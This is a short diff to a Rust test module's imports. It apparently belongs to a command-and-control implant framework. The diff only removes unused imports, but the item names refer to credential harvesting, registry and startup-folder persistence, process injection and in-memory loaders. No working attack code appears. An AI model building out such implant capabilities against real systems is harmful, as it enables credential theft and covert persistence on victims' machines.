@@ -1,24 +1,7 @@
 use super::*;
-use crate::download::{DOWNLOAD_MODE_OPEN, DOWNLOAD_REASON_REMOVED, DownloadState};
-use red_cell_common::demon::{
-    DemonConfigKey, DemonInjectError, DemonInjectWay, DemonNetCommand, PhantomPersistOp,
-};
+use red_cell_common::demon::{DemonPackage, PhantomPersistOp};
 
 use std::path::PathBuf;
-
-use crate::coffeeldr;
-use crate::dotnet;
-use red_cell_common::demon::{
-    DemonFilesystemCommand, DemonPackage, DemonProcessCommand, DemonTokenCommand,
-};
-
-use super::harvest::{
-    HarvestEntry, HarvestRoots, collect_credentials_for_roots, harvest_dispatch_result,
-};
-use super::persist::{
-    SPECTER_PERSIST_MARKER, SPECTER_RUN_VALUE_NAME, SPECTER_STARTUP_FILE_NAME, TestPersistGuard,
-    write_text_file,
-};
 
 mod assembly;
 mod config;
@@ -35,11 +18,9 @@ mod transfer;
 
 // Re-export dispatch-internal items for submodules.
 pub(super) use super::decode_utf16le_null;
-pub(super) use super::filesystem::unix_secs_to_ymd_hm;
 pub(super) use super::parse_bytes_le;
 pub(super) use super::parse_u32_le;
 pub(super) use super::parse_u64_le;
-pub(super) use super::process::{arch_from_wow64, translate_to_shell_cmd};
 pub(super) use super::write_ptr_be;
 pub(super) use super::write_ptr_le;
 
